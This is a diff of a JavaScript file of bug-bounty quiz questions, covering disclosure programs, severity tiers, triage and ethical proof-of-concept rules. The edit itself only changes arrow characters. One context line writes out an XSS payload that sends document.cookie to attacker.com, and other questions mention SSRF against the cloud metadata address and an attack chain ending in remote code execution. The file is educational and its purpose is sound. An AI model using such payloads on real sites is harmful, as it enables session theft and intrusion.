@@ -6,8 +6,8 @@ const questions = [
     hint: "Contrast a public reporting mailbox that awards recognition versus a paid reward program that pays money for bugs.",
     level: "basic",
     codeExample: `// VDP vs Bug Bounty Comparison:
-Vulnerability Disclosure Program (VDP): "See Something, Say Something" -> Recognition & Hall of Fame
-Bug Bounty Program:                     Incentivized Crowdsourced Hacking -> Cash Payouts in ₹ INR`
+Vulnerability Disclosure Program (VDP): "See Something, Say Something" → Recognition & Hall of Fame
+Bug Bounty Program:                     Incentivized Crowdsourced Hacking → Cash Payouts in ₹ INR`
   },
   {
     question: "What is RFC 9116 (`security.txt`), and why is it considered the global standard for machine-readable vulnerability disclosure?",
@@ -46,7 +46,7 @@ Expires: 2027-12-31T23:59:59.000Z`
     hint: "Follow the path from finding a bug to receiving the reward and disclosing it publicly.",
     level: "moderate",
     codeExample: `// Bug Bounty Report Lifecycle:
-Researcher Discovers Flaw -> Submits Report -> Triage Team Verifies -> Engineers Patch -> Bounty Paid (₹) -> Public Disclosure`
+Researcher Discovers Flaw → Submits Report → Triage Team Verifies → Engineers Patch → Bounty Paid (₹) → Public Disclosure`
   },
   {
     question: "What is the 'Vulnerability Rating Taxonomy' (VRT) used by platforms like Bugcrowd and HackerOne?",
@@ -55,11 +55,11 @@ Researcher Discovers Flaw -> Submits Report -> Triage Team Verifies -> Engineers
     hint: "Remember the P1 to P5 classification system that standardizes vulnerability severity.",
     level: "moderate",
     codeExample: `// VRT Severity & Payout Tier (Indian Tech FinTech Standards):
-P1 (Critical): Remote Code Execution (RCE)        -> ₹2,50,000 - ₹10,00,000
-P2 (High):     Critical IDOR / Stored XSS          -> ₹75,000 - ₹2,00,000
-P3 (Medium):   CSRF on State-Changing Action       -> ₹20,000 - ₹60,000
-P4 (Low):      Open URL Redirect                   -> ₹5,000 - ₹15,000
-P5 (Info):     Missing Security Header             -> ₹0 (Informational / Closed)`
+P1 (Critical): Remote Code Execution (RCE)        → ₹2,50,000 - ₹10,00,000
+P2 (High):     Critical IDOR / Stored XSS          → ₹75,000 - ₹2,00,000
+P3 (Medium):   CSRF on State-Changing Action       → ₹20,000 - ₹60,000
+P4 (Low):      Open URL Redirect                   → ₹5,000 - ₹15,000
+P5 (Info):     Missing Security Header             → ₹0 (Informational / Closed)`
   },
   {
     question: "What is 'Server-Side Request Forgery' (SSRF), and why does extracting AWS EC2 Cloud Metadata (`http://169.254.169.254/`) warrant maximum P1 Critical bounties?",
@@ -112,8 +112,8 @@ Prohibited Actions:
     hint: "Think of the first-come, first-served rule in race conditions for vulnerability reports.",
     level: "basic",
     codeExample: `// Triage Timestamp Resolution:
-Report #40921 (Researcher Mamata):   Submitted 10:14:02.140 UTC -> STATUS: TRIAGED & PAID (₹1,50,000)
-Report #40924 (Researcher Susmita):  Submitted 10:15:30.820 UTC -> STATUS: DUPLICATE (₹0)`
+Report #40921 (Researcher Mamata):   Submitted 10:14:02.140 UTC → STATUS: TRIAGED & PAID (₹1,50,000)
+Report #40924 (Researcher Susmita):  Submitted 10:15:30.820 UTC → STATUS: DUPLICATE (₹0)`
   },
   {
     question: "What is 'Safe Harbor with DMCA Exemption' in modern bug bounty program policies?",
@@ -145,8 +145,8 @@ app.get('/api/v1/patient/:id/records', async (req, res) => {
     hint: "Remember the standard 3-month (90-day) timeline giving companies time to fix bugs before public disclosure.",
     level: "basic",
     codeExample: `// 90-Day CVD Timeline:
-Day 00: Researcher discovers zero-day -> Submits private report to vendor.
-Day 30: Vendor acknowledges flaw -> Engineering squad begins code refactoring.
+Day 00: Researcher discovers zero-day → Submits private report to vendor.
+Day 30: Vendor acknowledges flaw → Engineering squad begins code refactoring.
 Day 75: Vendor deploys security patch to production cloud servers.
 Day 90: Coordinated public disclosure blog post released simultaneously.`
   },
@@ -183,7 +183,7 @@ fetch('https://attacker.com/steal?cookie=' + document.cookie);
 Step 1 (P4 Low):    Open URL Redirect bypasses OAuth redirect_uri whitelist.
 Step 2 (P3 Medium): Leaks OAuth Access Token in URL Fragment.
 Step 3 (P2 High):   Uses stolen token to access internal Admin API.
-Step 4 (P1 Critical): Admin API executes unvalidated shell command -> Full Remote Code Execution!`
+Step 4 (P1 Critical): Admin API executes unvalidated shell command → Full Remote Code Execution!`
   },
   {
     question: "What constitutes a 'High-Quality Vulnerability Report', and why do clear reproduction steps accelerate bounty payments?",
@@ -228,7 +228,7 @@ Advance Tax: Mandatory quarterly installment payments if annual tax liability ex
     hint: "Think about why taking one photograph of an open bank vault proves it is unlocked, while stealing all the gold bars is a crime.",
     level: "expert",
     codeExample: `// The Ethical PoC Cardinal Rule:
-VALID PROOF-OF-CONCEPT: Retrieve 1 test record -> Stop immediately -> Submit report.
+VALID PROOF-OF-CONCEPT: Retrieve 1 test record → Stop immediately → Submit report.
 CRIMINAL VIOLATION:      Dumping 500,000 live production customer records to local disk.`
   },
   {
